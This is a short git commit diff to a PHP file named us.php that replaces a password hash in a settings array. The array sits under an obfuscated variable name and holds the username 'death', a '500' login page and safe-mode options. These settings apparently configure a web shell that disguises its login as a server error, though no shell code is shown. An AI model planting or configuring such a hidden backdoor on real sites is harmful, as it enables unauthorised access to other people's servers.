9c556bb27b296ab711725f9360a67035d8a4ed15
Veccy <107405609+qeize@users.noreply.github.com>
2025-05-24 11:51:37 +0700

    Add files via upload

--- us.php
+++ us.php
@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'death',
-    'password' => 'a8b0c2d4e6f8a1b3c5d7e9f2b4d6f8h0',
+    'password' => '2e8d6dbf9112a879d4ceb15403d10a78',
     'safe_mode' => '1',
     'login_page' => '500',
     'show_icons' => '1',
